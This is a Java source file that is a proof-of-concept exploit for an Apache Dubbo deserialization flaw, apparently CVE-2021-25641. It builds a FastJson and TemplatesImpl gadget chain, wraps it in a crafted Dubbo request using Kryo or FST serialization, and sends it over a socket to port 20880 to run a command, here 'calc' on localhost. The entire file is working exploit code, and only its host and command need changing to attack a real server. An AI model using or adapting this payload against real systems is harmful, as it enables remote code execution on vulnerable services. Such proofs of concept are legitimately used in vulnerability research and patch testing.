package com.arliya.dubbo.main;

import com.alibaba.fastjson.JSONObject;
import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.ObjectOutput;
import org.apache.dubbo.common.serialize.fst.FstObjectOutput;
import org.apache.dubbo.common.serialize.kryo.KryoObjectOutput;

import java.io.ByteArrayOutputStream;

import java.io.OutputStream;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;

public class CVE202125641 {

    public static String SerType = "Kyro";

    public static Object getGadgetsObj(String cmd) throws Exception{
        //Make TemplatesImpl
        Object templates = Utils.createTemplatesImpl(cmd);
        //Make FastJson Gadgets Chain
        JSONObject jo = new JSONObject();
        jo.put("oops",templates);
        return Utils.makeXStringToStringTrigger(jo);
    }

    public static void main(String[] args) throws Exception {

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        byte[] header = new byte[16];
        ObjectOutput objectOutput;
        Bytes.short2bytes((short) 0xdabb, header);

        switch (SerType) {
            case "FST":
                objectOutput = new FstObjectOutput(baos);
                header[2] = (byte) ((byte) 0x80 | (byte)9 | (byte) 0x40);
                break;
            case "Kyro":
            default:
                objectOutput = new KryoObjectOutput(baos);
                header[2] = (byte) ((byte) 0x80 | (byte)8 | (byte) 0x40);
                break;
        }

        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
        objectOutput.writeUTF("2.0.2");
        objectOutput.writeUTF("org.apache.dubbo.samples.basic.api.DemoService");
        objectOutput.writeUTF("0.0.0");
//        objectOutput.writeUTF("sayHello");
        objectOutput.writeUTF("$invoke");
        objectOutput.writeUTF("Ljava/lang/String;"); //*/

        objectOutput.writeObject(getGadgetsObj("calc"));

        objectOutput.writeObject(null);
        objectOutput.flushBuffer();

        //Transform ObjectOutput to bytes payload
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        Bytes.int2bytes(baos.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(baos.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        //Send Payload
        Socket socket = new Socket("127.0.0.1", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }
}